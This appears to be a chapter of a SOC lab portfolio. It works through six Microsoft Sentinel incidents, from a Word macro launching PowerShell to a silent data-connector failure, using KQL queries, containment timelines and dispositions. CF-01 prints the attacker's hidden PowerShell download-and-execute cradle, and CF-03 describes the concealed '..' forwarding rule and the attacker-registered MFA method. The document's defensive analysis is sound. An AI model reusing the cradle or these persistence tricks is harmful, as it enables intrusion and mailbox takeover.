# 08 - Investigation Case Files

Six incidents worked end to end. The KQL that answered each question, the reasoning, and the disposition.

Three true positives, one false positive, one benign positive, and one health incident that would have been missed. That spread is deliberate. An investigation log with only true positives in it is a highlight reel, not a record of how somebody works.

---

## CF-01: Office Process Spawned a Shell

| | |
| --- | --- |
| **Incident** | INC-0412 |
| **Rule** | SEN-001, NRT |
| **Severity** | High |
| **Created** | 2026-09-14 09:41:14 |
| **Acknowledged** | 09:42, 46 seconds |
| **Closed** | 10:18 |
| **Disposition** | **True positive**, escalated |

### The alert

```text
Office process WINWORD.EXE spawned powershell.exe on WS11-01
vbunny@vbunnylab.com ran:
powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...
```

Custom details already carried the parent, the command line and the hash. PB-01 had posted threat intelligence 22 seconds after creation.

### Q1. Is it real

Read the raw event. Parent was `WINWORD.EXE`, PID 2180, integrity level Medium. Word starting PowerShell is not something that happens by accident.

Real.

### Q2. Is it authorised

Change calendar clean. No deployment, no testing window.

Not authorised.

### Q3. What did it do

Decoded the payload. The PowerShell operational log had it already deobfuscated, so no manual decode was needed.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.44:8080/u.ps1')
```

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-09-14 09:41:00) .. datetime(2026-09-14 09:50:00))
| where DeviceName startswith "WS11-01"
| where RemoteIPType == "Public"
| project TimeGenerated, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl, ActionType
```

One connection attempt to `198.51.100.44:8080` at 09:41:19. `ActionType` was `ConnectionFailed`. The firewall rule blocking CORP to the external range stopped it.

PB-01 enrichment: VirusTotal 11 of 89, AbuseIPDB 94 percent, no prior internal history in 90 days.

### Q4. Where did the document come from

```kql
DeviceFileEvents
| where TimeGenerated > ago(1d)
| where DeviceName startswith "WS11-01"
| where FileName endswith ".docm"
| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName, SHA256
```

`Q3-Invoice-Review.docm` written to Downloads at 09:37:02 by `outlook.exe`. An email attachment.

```kql
EmailAttachmentInfo
| where TimeGenerated > ago(1d)
| where FileName == "Q3-Invoice-Review.docm"
| join kind=inner (EmailEvents | where TimeGenerated > ago(1d)) on NetworkMessageId
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject, DeliveryLocation, SHA256
```

One recipient. Sender `billing@vbunny1ab.com`. Delivered to Inbox.

### Q5. Scope

```kql
// Anyone else run the same thing
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where ProcessCommandLine has "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0"
| distinct DeviceName, AccountName
```

Empty.

```kql
// Anyone else contact the address
DeviceNetworkEvents
| where TimeGenerated > ago(7d)
| where RemoteIP == "198.51.100.44"
| distinct DeviceName
```

WS11-01 only.

```kql
// Did it establish persistence
union DeviceRegistryEvents, DeviceProcessEvents
| where TimeGenerated between (datetime(2026-09-14 09:41:00) .. datetime(2026-09-14 10:00:00))
| where DeviceName startswith "WS11-01"
| where RegistryKey has_any (@"CurrentVersion\Run", "Winlogon")
    or FileName in~ ("schtasks.exe", "sc.exe", "reg.exe")
| project TimeGenerated, FileName, ProcessCommandLine, RegistryKey, RegistryValueData
```

Empty. The download failed, so the second stage never arrived and nothing persisted.

### Checked and clean

- No other device ran the command line
- No other device contacted the IP
- No persistence created
- `vbunny` holds no privileged role
- Defender healthy, no exclusions
- No lateral movement from WS11-01

### Actions

```text
09:47  PB-05 isolation requested, approved, selective isolation applied
09:52  198.51.100.44 blocked at the firewall for all segments
09:56  Sender and domain added to the tenant block list
10:04  Message purged, 1 recipient
10:09  Escalated to Tier 2 for device rebuild decision
10:18  Closed as True Positive, handed to Tier 2
```

### Note

Detection to acknowledgement was 46 seconds because the rule is NRT and PB-03 assigned it automatically.

The firewall did the containment, not the detection. The detection told me it happened. Segmentation stopped it working. Both mattered and neither alone would have been enough.

---

## CF-02: Password Spray From an External Address

| | |
| --- | --- |
| **Incident** | INC-0389 |
| **Rule** | SEN-002 |
| **Severity** | High |
| **Created** | 2026-09-09 02:14:07 |
| **Acknowledged** | 08:11, **5 h 57 m** |
| **Closed** | 08:34 |
| **Disposition** | **True positive**, no compromise |

### The alert

31 distinct accounts failed authentication from `203.0.113.88` between 02:11 and 02:14.

### Q1 and Q2

Real, and not authorised. Nothing scheduled at 02:00.

### Q3. Did anything succeed

The question that decides everything.

```kql
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated between (datetime(2026-09-09 02:00:00) .. datetime(2026-09-09 04:00:00))
| where IPAddress == "203.0.113.88"
| summarize
    Attempts  = count(),
    Succeeded = countif(ResultType == 0),
    Accounts  = dcount(UserPrincipalName),
    Results   = make_set(ResultDescription, 10)
  by IPAddress
```

`Succeeded` was 0.

### Q4. What did the failures look like

```kql
SigninLogs
| where TimeGenerated between (datetime(2026-09-09 02:00:00) .. datetime(2026-09-09 03:00:00))
| where IPAddress == "203.0.113.88"
| summarize Count = count() by ResultType, ResultDescription
| order by Count desc
```

| ResultType | Description | Count |
| --- | --- | --- |
| 50126 | Invalid username or password | 24 |
| 50053 | Account locked | 4 |
| 50034 | User account does not exist | 3 |

Twenty-four real accounts with wrong passwords. Three names that do not exist. The attacker had a mostly accurate user list, which usually means it came from a data breach or from LinkedIn.

### Q5. Was MFA the thing that saved us

**No, and this is the important finding.** `ResultType` 50126 means the password itself was wrong. Nothing got as far as an MFA prompt.

If any password had been correct, the result would have been 50074 or 50076, MFA required. None were.

So the passwords held. That is luck rather than architecture, because the same spray against an account with a weak password succeeds at the password stage, and only then does MFA matter.

```kql
// Were any of the targeted accounts without MFA
let Targeted = SigninLogs
    | where TimeGenerated between (datetime(2026-09-09 02:00:00) .. datetime(2026-09-09 03:00:00))
    | where IPAddress == "203.0.113.88"
    | distinct UserPrincipalName;
SigninLogs
| where TimeGenerated > ago(30d)
| where UserPrincipalName in (Targeted)
| where ResultType == 0
| summarize AuthMethods = make_set(tostring(AuthenticationDetails)) by UserPrincipalName
```

Two accounts had no MFA registration in 30 days of successful sign-ins. Both were service-style accounts.

### Checked and clean

- No successful authentication from the source
- No legacy authentication from the source
- No token refresh activity from the source
- Four locked accounts all unlocked normally, no follow-up attempts
- No subsequent activity from the source in 7 days

### Actions

```text
08:14  203.0.113.88 blocked at the perimeter
08:19  Four locked accounts confirmed with their owners, unlocked
08:26  Raised a finding: 2 accounts without MFA
08:34  Closed as True Positive, no compromise
```

### Note

**Acknowledged in 5 hours 57 minutes because it fired at 02:14 and nobody was on shift.**

That is the real finding in this case file and it is worth more than the incident itself. Detection latency was 38 seconds. Response latency was six hours. If one of those 24 passwords had been correct, the attacker had six uninterrupted hours.

This is the strongest argument in the whole project for either 24/7 coverage or automated containment on high confidence rules, and it is why that item sits at Medium priority in the roadmap rather than Low.

---

## CF-03: Phishing to Credential Theft to Business Email Compromise

| | |
| --- | --- |
| **Incident** | INC-0401 |
| **Rules** | SEN-009, SEN-005, SEN-010 Fusion |
| **Severity** | High, raised to Critical |
| **Created** | 2026-09-11 11:02:41 |
| **Acknowledged** | 11:06, 4 minutes |
| **Closed** | 2026-09-12 16:40 |
| **Disposition** | **True positive**, contained |

The flagship case. It started as a Medium legacy authentication alert and became a full identity compromise.

### The chain

```text
09:14  m.calloway receives a payroll-themed phishing message (PH-03)
09:22  Clicks the link
09:24  Submits credentials on a cloned Microsoft 365 page
10:47  Attacker authenticates using IMAP from 198.51.100.77
11:02  SEN-009 fires: legacy authentication succeeded        <- Medium
11:41  Attacker creates an inbox forwarding rule
11:43  SEN-005 fires: mailbox forwarding rule created        <- High
11:44  Fusion correlates both into one incident              <- Critical
```

### Q1. Start at the legacy auth alert

```kql
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1d)
| where UserPrincipalName =~ "m.calloway@vbunnylab.com"
| extend Country = tostring(LocationDetails.countryOrRegion)
| project TimeGenerated, IPAddress, Country, ClientAppUsed, AppDisplayName,
          ResultType, ResultDescription
| order by TimeGenerated asc
```

| Time | IP | Country | Client | Result |
| --- | --- | --- | --- | --- |
| 08:31 | 203.0.113.5 | US | Browser | 0 |
| 09:22 | 203.0.113.5 | US | Browser | 0 |
| **10:47** | **198.51.100.77** | **NL** | **IMAP4** | **0** |
| 11:41 | 198.51.100.77 | NL | IMAP4 | 0 |

Different country, different protocol, successful. IMAP does not support MFA, so conditional access never got a chance.

### Q2. How did they get the password

Worked backwards from the sign-in.

```kql
let Target = "m.calloway@vbunnylab.com";
UrlClickEvents
| where TimeGenerated > ago(2d)
| where AccountUpn =~ Target
| project TimeGenerated, Url, ActionType, IsClickedThrough, IPAddress
| order by TimeGenerated asc
```

Click at 09:22 on `hxxps://vbunny1ab[.]com/hr/payroll-update`. `ActionType` was `ClickAllowed`. Safe Links did not block it because the domain had no reputation yet.

```kql
EmailEvents
| where TimeGenerated > ago(2d)
| where SenderFromDomain == "vbunny1ab.com"
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject,
          DeliveryLocation, ThreatTypes
```

Four recipients. Two clicked. One submitted credentials, confirmed by the sign-in that followed.

Domain registered 6 days before the campaign. SPF, DKIM and DMARC all passed, because the attacker owned the domain.

### Q3. What did they do with the access

```kql
OfficeActivity
| where TimeGenerated > ago(2d)
| where UserId =~ "m.calloway@vbunnylab.com"
| where ClientIP == "198.51.100.77"
| project TimeGenerated, Operation, ClientIP, Parameters
| order by TimeGenerated asc
```

| Time | Operation | Detail |
| --- | --- | --- |
| 10:48 | MailItemsAccessed | Read the inbox |
| 10:52 | MailItemsAccessed | Searched. Keywords in the parameters: invoice, payment, bank |
| 11:41 | New-InboxRule | Rule `..` forwarding to `acc.recovery@protonmail.com`, DeleteMessage true |

**The rule was named `..`**, two dots. That is deliberate. It renders as almost nothing in the Outlook rules list and a user scrolling past will not notice it.

### Q4. Persistence beyond the password

The three checks that decide whether a password reset is enough.

```kql
// New MFA methods
AuditLogs
| where TimeGenerated > ago(2d)
| where OperationName has_any ("Add security info", "User registered security info")
| extend Target = tostring(TargetResources[0].userPrincipalName)
| where Target =~ "m.calloway@vbunnylab.com"
```

One result. A phone number registered at 11:38 from `198.51.100.77`. **The attacker registered their own MFA method**, which would have let them pass MFA on the next login from any protocol.

```kql
// Application consent
AuditLogs
| where TimeGenerated > ago(2d)
| where OperationName has "Consent to application"
| extend Actor = tostring(InitiatedBy.user.userPrincipalName)
| where Actor =~ "m.calloway@vbunnylab.com"
```

Empty.

```kql
// Did the account send anything
EmailEvents
| where TimeGenerated > ago(2d)
| where SenderFromAddress =~ "m.calloway@vbunnylab.com"
| project TimeGenerated, RecipientEmailAddress, Subject, DeliveryLocation
```

Empty. Caught before the outbound stage.

### Containment, in order

```text
11:52  Password reset
11:53  All sessions and refresh tokens revoked
11:55  Attacker-registered MFA phone number removed
11:58  Inbox rule ".." deleted, exported first as evidence
12:04  198.51.100.77 blocked
12:09  vbunny1ab.com blocked at the tenant level
12:14  Message purged, 4 recipients
12:31  Second clicker confirmed no credentials submitted, monitored 48 hours
13:00  Conditional access policy drafted to block legacy authentication
```

**Order matters and this is the order.** Reset, then revoke, then remove the attacker's MFA method, then remove the rule. Any other order leaves a hole:

- Reset without revoke leaves the session alive
- Revoke without removing their MFA method lets them re-authenticate
- Removing the rule first tips them off before you have closed the door

### Checked and clean

- No mail sent from the account
- No application consent granted
- No other account authenticated from `198.51.100.77`
- No device compromise, the credentials were phished not stolen from an endpoint
- Second clicker did not submit credentials
- No access to SharePoint or Teams from the attacker IP

### Root cause

| # | Cause | Fix |
| --- | --- | --- |
| 1 | Legacy authentication permitted | Conditional access block. Deployed 2026-09-12 |
| 2 | Safe Links allowed a zero-reputation domain | Tightened policy, block unknown-reputation domains |
| 3 | No alert on MFA method registration from a new IP | New rule written |
| 4 | User could not distinguish the lookalike domain | Awareness item |

**Cause 1 is the one that mattered.** MFA was enabled on this account and it did nothing, because IMAP does not support it. Every other control was downstream of that.

### Note

This case is why [03-Analytics-Rules.md](03-Analytics-Rules.md) has SEN-009 at Medium rather than Low. On its own, a legacy auth sign-in is nearly noise. Correlated with anything else on the same account, it is the start of a compromise.

Fusion made that correlation without me. That is the one place in this project where the machine learning earned its place.

---

## CF-04: Impossible Travel

| | |
| --- | --- |
| **Incident** | INC-0418 |
| **Rule** | SEN-003 |
| **Severity** | Medium |
| **Created** | 2026-09-15 13:22:10 |
| **Acknowledged** | 13:44, 22 minutes |
| **Closed** | 14:02 |
| **Disposition** | **False positive** |

### The alert

`m.calloway` signed in from the US at 11:48 and from Germany at 13:19. 91 minutes apart.

### Q1. Is it real

```kql
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(6h)
| where UserPrincipalName =~ "m.calloway@vbunnylab.com"
| where ResultType == 0
| extend
    Country = tostring(LocationDetails.countryOrRegion),
    City    = tostring(LocationDetails.city),
    ASN     = tostring(parse_json(tostring(NetworkLocationDetails))[0].networkNames)
| project TimeGenerated, IPAddress, Country, City, ASN, AppDisplayName,
          ClientAppUsed, DeviceDetail
| order by TimeGenerated asc
```

Both sign-ins real and successful.

### Q2. Same device

```kql
SigninLogs
| where TimeGenerated > ago(6h)
| where UserPrincipalName =~ "m.calloway@vbunnylab.com"
| extend
    DeviceId   = tostring(DeviceDetail.deviceId),
    DeviceName = tostring(DeviceDetail.displayName),
    OS         = tostring(DeviceDetail.operatingSystem),
    Browser    = tostring(DeviceDetail.browser),
    Compliant  = tostring(DeviceDetail.isCompliant)
| project TimeGenerated, IPAddress, DeviceId, DeviceName, OS, Browser, Compliant
```

**Same `DeviceId`, same device name, same browser version, both compliant.**

That settles it. An attacker in Germany is not using the victim's enrolled, compliant, managed device.

### Q3. Why the German IP

The German address belonged to a consumer VPN provider, confirmed by ASN lookup. Sign-in at 13:19 was from the same managed laptop with a VPN client active.

Confirmed with the user at 13:56. They had connected to a VPN to check whether a supplier's website was geo-blocked.

### Checked and clean

- Same device ID on both sign-ins
- Device compliant and enrolled on both
- No legacy authentication
- No inbox rule changes
- No MFA method changes
- No unusual mailbox activity
- The German ASN belongs to a known consumer VPN provider

### Disposition

False positive. Legitimate user on their own device behind a VPN.

### Rule change

**None.** I considered adding the VPN range to `TrustedIPs` and decided against it.

That address belongs to a consumer VPN with rotating pools. Allowlisting it would allowlist every other user of that provider, including an attacker. The exclusion would be wider than the problem.

The better fix is [Q42](02-KQL-Query-Library.md), which compares a user against their own country history rather than against a travel-time assumption. That is on the roadmap for when 30 days of baseline exists.

### Note

**The `DeviceId` comparison is the single most useful field in an impossible travel investigation** and it is not in the alert by default. Two sign-ins from the same enrolled device are one person with a VPN. Two sign-ins from different devices are worth the full workup.

Adding `DeviceId` to the SEN-003 custom details would have cut this from 18 minutes to about 3. That change is made.

---

## CF-05: Privileged Role Assignment

| | |
| --- | --- |
| **Incident** | INC-0423 |
| **Rule** | SEN-006 |
| **Severity** | High |
| **Created** | 2026-09-16 10:33:09 |
| **Acknowledged** | 10:34, 1 minute |
| **Closed** | 10:41 |
| **Disposition** | **Benign positive** |

### The alert

`m.calloway@vbunnylab.com` added to `Exchange Administrator` by `vampiricbunny@vbunnylab.com`.

### Q1. Is it real

```kql
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName has "Add member to role"
| extend
    Role   = tostring(TargetResources[0].modifiedProperties[1].newValue),
    Target = tostring(TargetResources[0].userPrincipalName),
    Actor  = tostring(InitiatedBy.user.userPrincipalName),
    IP     = tostring(InitiatedBy.user.ipAddress)
| project TimeGenerated, Actor, IP, Target, Role, Result
```

Real. Succeeded.

### Q2. Is it authorised

Change calendar. CHG-0088, approved 2026-09-14, scheduled for this morning. `m.calloway` taking over mail administration.

**Authorised.** Total elapsed on questions 1 and 2: about 90 seconds.

### Q3. Anything else

```kql
// Was the actor's own session normal
SigninLogs
| where TimeGenerated > ago(4h)
| where UserPrincipalName =~ "vampiricbunny@vbunnylab.com"
| extend Country = tostring(LocationDetails.countryOrRegion)
| project TimeGenerated, IPAddress, Country, AppDisplayName,
          ResultType, DeviceDetail
```

Normal. Known device, expected location, MFA satisfied.

```kql
// Any other directory changes in the window
AuditLogs
| where TimeGenerated between (datetime(2026-09-16 10:00:00) .. datetime(2026-09-16 11:00:00))
| where Category == "RoleManagement"
| project TimeGenerated, OperationName,
          Actor = tostring(InitiatedBy.user.userPrincipalName),
          Target = tostring(TargetResources[0].userPrincipalName)
```

One change only. No add-then-remove pattern, no bundle of changes.

### Disposition

**Benign positive**, not false positive.

The detection was correct. A privileged role really was assigned. It was authorised.

Closing this as a false positive would imply the rule needs tuning. It does not. It did exactly what it was built to do, and a rule that catches authorised privileged changes is a rule that will catch unauthorised ones.

### Finding raised

The change granted **permanent** `Exchange Administrator` for a task that is periodic.

Recommended converting to a Privileged Identity Management eligible assignment with just-in-time activation. That way the role exists only when it is activated, which shrinks the window in which stealing that credential is useful from permanent to a few hours.

### Note

One minute to acknowledge, seven minutes to close, because the change record existed and was easy to find.

The same event with no change record is a potential tenant compromise and takes an hour of phone calls. That is the entire argument for change management from a SOC perspective, in one comparison.

---

## CF-06: Data Connector Stopped

| | |
| --- | --- |
| **Incident** | INC-0430 |
| **Rule** | SEN-011 |
| **Severity** | Medium |
| **Created** | 2026-09-18 04:00:22 |
| **Acknowledged** | 08:09 |
| **Closed** | 09:47 |
| **Disposition** | **True positive**, environment fault |

Not an attack. Included because it is the incident that would have caused the next attack to be missed.

### The alert

`SecurityEvent` volume dropped to 11 percent of its seven day baseline.

### Q1. Which hosts

```kql
SecurityEvent
| where TimeGenerated > ago(3d)
| summarize Events = count() by Computer, bin(TimeGenerated, 1h)
| render timechart
```

Three of four hosts steady. `FS01` flat at zero from 2026-09-17 22:40.

### Q2. Is the agent alive

```kql
Heartbeat
| where TimeGenerated > ago(3d)
| where Computer startswith "FS01"
| summarize LastSeen = max(TimeGenerated), Beats = count() by bin(TimeGenerated, 1h)
| order by TimeGenerated desc
```

**Heartbeats were arriving normally.** The agent was alive, connected, and reporting health. It was just not sending Security events.

That is the worst kind of failure. Agent health monitoring showed green.

### Q3. What changed at 22:40

```kql
AzureActivity
| where TimeGenerated between (datetime(2026-09-17 22:00:00) .. datetime(2026-09-17 23:30:00))
| project TimeGenerated, OperationNameValue, Caller, ResourceGroup, ActivityStatusValue, Properties
| order by TimeGenerated asc
```

A data collection rule association had been updated at 22:38 as part of an automated agent extension upgrade. The DCR association for `FS01` had been dropped and not recreated.

### Q4. What was lost

```text
2026-09-17 22:40 to 2026-09-18 08:15
9 hours 35 minutes of Security events from FS01
```

FS01 is the file server. The events lost included 4624, 4625, 5140 and 7045 for that window. Three detections depended on that data for that host: SEN-002, SEN-006 on-premises, and the service installation rule.

### Q5. Did anything happen during the gap

Partial coverage from Defender XDR, which is a separate pipeline and kept working.

```kql
union DeviceLogonEvents, DeviceProcessEvents
| where TimeGenerated between (datetime(2026-09-17 22:40:00) .. datetime(2026-09-18 08:15:00))
| where DeviceName startswith "FS01"
| summarize Events = count() by Type, bin(TimeGenerated, 1h)
```

Defender data was complete for the window. Reviewed the logon and process events manually. Nothing anomalous.

**That is luck, not design.** If the attack had been one the Defender pipeline did not cover, there would be no answer at all.

### Actions

```text
08:24  DCR association recreated for FS01
08:31  Confirmed events flowing
08:44  Verified the other three hosts had intact associations
09:02  Reviewed the gap window using Defender data
09:31  Raised a change to pin the agent extension version
09:47  Closed
```

### Root cause

Automatic agent extension upgrade dropped the DCR association without recreating it. No error was raised by any component. Heartbeat stayed healthy the whole time.

### Fix

```text
1. Automatic extension upgrade disabled, upgrades scheduled in a change window
2. SEN-011 threshold tightened from 40 percent to 60 percent of baseline
3. Per-host volume monitoring added, not just per-table
```

Point 3 is the real fix. SEN-011 watched the table total, and with one of four hosts silent the table total only dropped enough to trip the rule because FS01 is the noisiest host. On a larger estate, one silent host out of fifty would not move the table total at all.

```kql
// The per-host version, now deployed
let Baseline = 7d;
SecurityEvent
| where TimeGenerated > ago(Baseline)
| summarize Events = count() by Computer, Day = bin(TimeGenerated, 1d)
| summarize AvgDaily = avg(Events) by Computer
| join kind=inner (
    SecurityEvent
    | where TimeGenerated > ago(4h)
    | summarize Recent = count() by Computer
    | extend Projected = Recent * 6
  ) on Computer
| where Projected < AvgDaily * 0.5
| project Computer, AvgDaily = round(AvgDaily, 0), Projected,
          DropPercent = round((1 - (Projected / AvgDaily)) * 100, 1)
```

### Note

**A SIEM that has stopped receiving data looks exactly like a quiet day.**

Nobody would have noticed this. Heartbeat was green, the connector page showed healthy, and the dashboard showed a slightly quieter night. The only thing that caught it was a rule specifically built to detect its own absence.

SEN-011 is the least interesting rule in the project and it is the one I would refuse to run a SIEM without.

---

## Summary

| Case | Rule | Severity | Ack | Disposition |
| --- | --- | --- | --- | --- |
| CF-01 Office spawns shell | SEN-001 | High | 46 s | True positive, escalated |
| CF-02 External password spray | SEN-002 | High | 5 h 57 m | True positive, no compromise |
| CF-03 Phishing to BEC | SEN-009, SEN-005, Fusion | Critical | 4 min | True positive, contained |
| CF-04 Impossible travel | SEN-003 | Medium | 22 min | False positive |
| CF-05 Privileged role | SEN-006 | High | 1 min | Benign positive |
| CF-06 Connector stopped | SEN-011 | Medium | 4 h 9 m | True positive, environment |

### What the six show together

**The change calendar decided three of them.** CF-05 closed in seven minutes because the record existed. CF-01 and CF-02 were escalated partly because nothing explained them.

**The slow ones were slow because of the clock, not the work.** CF-02 and CF-06 both fired overnight. Both were worked quickly once someone was there. Detection latency was seconds; response latency was hours.

**The cheapest wins came from one field.** `DeviceId` settled CF-04. `ResultType` settled CF-02. `DeliveryLocation` settled the scope on CF-03. Knowing which single field answers the question is most of the speed.

**The most valuable case is the least dramatic.** CF-06 was not an attack. It was nine hours of blindness that nothing else would have reported.

---

Next: [09-Workbooks-and-Reporting.md](09-Workbooks-and-Reporting.md)
